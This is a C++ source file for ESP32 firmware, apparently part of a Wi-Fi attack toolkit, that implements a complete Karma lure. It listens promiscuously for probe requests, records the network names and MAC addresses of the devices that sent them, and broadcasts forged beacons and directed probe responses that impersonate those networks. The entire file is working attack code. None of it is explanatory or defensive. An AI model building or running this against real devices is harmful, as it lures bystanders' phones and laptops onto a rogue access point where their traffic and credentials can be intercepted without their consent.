// karma.cpp -- Karma / probe-response lure (see karma.h).
#include "karma.h"
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_log.h"

static const char* TAG = "karma";

#define TICK_MS   100
#define MAX_SSID  32

typedef struct {
  char    ssid[33];      // 32 chars + null
  uint8_t len;
  uint8_t sta[6];        // last device that probed for it
} entry_t;

static bool               g_running = false;
static volatile uint32_t  g_sent    = 0;
static esp_timer_handle_t g_tmr      = 0;
static uint8_t            g_chan     = 1;
static const uint8_t      CHANS[3]   = {1, 6, 11};
static int                g_chi      = 0;
static entry_t            g_tab[MAX_SSID];
static volatile int       g_count    = 0;
static uint8_t            g_buf[128];

// Add (or refresh) a harvested SSID. Called from the WiFi RX task.
static void harvest(const char* ssid, int slen, const uint8_t* sta) {
  if (slen <= 0 || slen > 32) return;
  for (int i = 0; i < g_count; i++) {
    if (g_tab[i].len == slen && memcmp(g_tab[i].ssid, ssid, slen) == 0) {
      memcpy(g_tab[i].sta, sta, 6);
      return;
    }
  }
  if (g_count >= MAX_SSID) return;
  int i = g_count;                    // fill fully before publishing the slot
  memcpy(g_tab[i].ssid, ssid, slen);
  g_tab[i].ssid[slen] = 0;
  g_tab[i].len = (uint8_t)slen;
  memcpy(g_tab[i].sta, sta, 6);
  g_count = i + 1;
}

static void rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* f = p->payload;
  int len = p->rx_ctrl.sig_len;
  if (len < 26) return;
  if (f[0] != 0x40) return;           // mgmt / probe-request
  const uint8_t* sa = f + 10;         // source (the probing device)
  const uint8_t* ie = f + 24;         // tagged params
  int rem = len - 24 - 4;             // minus FCS
  while (rem >= 2) {
    uint8_t tag = ie[0], tl = ie[1];
    if (2 + tl > rem) break;
    if (tag == 0) {                   // SSID element
      if (tl > 0 && tl <= 32) harvest((const char*)(ie + 2), tl, sa);
      return;                         // SSID is always the first IE
    }
    ie  += 2 + tl;
    rem -= 2 + tl;
  }
}

// Build a beacon (0x80, bcast DA) or probe response (0x50, directed DA).
static int build_frame(uint8_t fc0, const uint8_t* da, const char* ssid,
                       int slen, int idx, uint8_t chan) {
  if (slen > 32) slen = 32;
  int o = 0;
  g_buf[o++] = fc0; g_buf[o++] = 0x00;             // frame control
  g_buf[o++] = 0x00; g_buf[o++] = 0x00;            // duration
  for (int i = 0; i < 6; i++) g_buf[o++] = da[i];  // DA
  uint8_t bss[6] = {0x02, 0x11, 0x22, 0x33, 0x44, (uint8_t)idx};
  for (int i = 0; i < 6; i++) g_buf[o++] = bss[i]; // SA = BSSID
  for (int i = 0; i < 6; i++) g_buf[o++] = bss[i]; // BSSID
  g_buf[o++] = 0x00; g_buf[o++] = 0x00;            // sequence
  for (int i = 0; i < 8; i++) g_buf[o++] = 0x00;   // timestamp
  g_buf[o++] = 0x64; g_buf[o++] = 0x00;            // beacon interval
  g_buf[o++] = 0x01; g_buf[o++] = 0x04;            // capability (ESS)
  g_buf[o++] = 0x00; g_buf[o++] = (uint8_t)slen;   // SSID element
  memcpy(g_buf + o, ssid, slen); o += slen;
  g_buf[o++] = 0x01; g_buf[o++] = 0x08;            // supported rates
  g_buf[o++] = 0x82; g_buf[o++] = 0x84; g_buf[o++] = 0x8b; g_buf[o++] = 0x96;
  g_buf[o++] = 0x24; g_buf[o++] = 0x30; g_buf[o++] = 0x48; g_buf[o++] = 0x6c;
  g_buf[o++] = 0x03; g_buf[o++] = 0x01; g_buf[o++] = chan;   // DS param
  return o;
}

static const uint8_t BCAST[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

static void tick_cb(void* arg) {
  (void)arg;
  uint8_t ch = CHANS[g_chi];
  g_chi = (g_chi + 1) % 3;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  g_chan = ch;
  int n = g_count;
  for (int i = 0; i < n; i++) {
    int l = build_frame(0x80, BCAST, g_tab[i].ssid, g_tab[i].len, i, ch);
    if (esp_wifi_80211_tx(WIFI_IF_STA, g_buf, l, true) == ESP_OK) g_sent = g_sent + 1;
    l = build_frame(0x50, g_tab[i].sta, g_tab[i].ssid, g_tab[i].len, i, ch);
    if (esp_wifi_80211_tx(WIFI_IF_STA, g_buf, l, true) == ESP_OK) g_sent = g_sent + 1;
  }
}

bool karma_start(void) {
  if (g_running) return true;
  g_sent = 0; g_chi = 0; g_count = 0;
  if (esp_wifi_set_mode(WIFI_MODE_STA) != ESP_OK) return false;
  if (esp_wifi_start() != ESP_OK) return false;
  esp_wifi_set_promiscuous(true);
  wifi_promiscuous_filter_t filt = {};
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(rx_cb);
  esp_wifi_set_channel(CHANS[0], WIFI_SECOND_CHAN_NONE);
  esp_timer_create_args_t ta = {};
  ta.callback = tick_cb;
  ta.name     = "karma";
  if (esp_timer_create(&ta, &g_tmr) != ESP_OK) {
    esp_wifi_set_promiscuous(false);
    return false;
  }
  esp_timer_start_periodic(g_tmr, (uint64_t)TICK_MS * 1000);
  g_running = true;
  ESP_LOGI(TAG, "karma start");
  return true;
}

void karma_stop(void) {
  if (!g_running) return;
  if (g_tmr) { esp_timer_stop(g_tmr); esp_timer_delete(g_tmr); g_tmr = 0; }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  g_running = false;
  ESP_LOGI(TAG, "karma stop (ssids %d, sent %u)", g_count, (unsigned)g_sent);
}

bool     karma_running(void)    { return g_running; }
int      karma_ssid_count(void) { return g_count; }
uint32_t karma_sent(void)       { return g_sent; }
uint8_t  karma_channel(void)    { return g_chan; }

bool karma_ssid(int i, char* out, int len) {
  if (i < 0 || i >= g_count || !out || len <= 0) return false;
  strncpy(out, g_tab[i].ssid, len - 1);
  out[len - 1] = 0;
  return true;
}
